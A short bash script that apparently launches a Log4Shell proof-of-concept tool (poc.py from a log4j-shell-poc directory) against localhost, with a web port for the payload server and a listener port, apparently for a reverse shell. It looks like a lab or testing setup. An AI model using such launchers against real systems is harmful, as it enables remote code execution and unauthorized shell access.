#generatelog4jpayload.sh
#!/bin/bash
echo "site runs at port 8080"
cd ~/mylog4j/log4j-shell-poc
python3 poc.py --userip localhost --webport 8000 --lport 9001
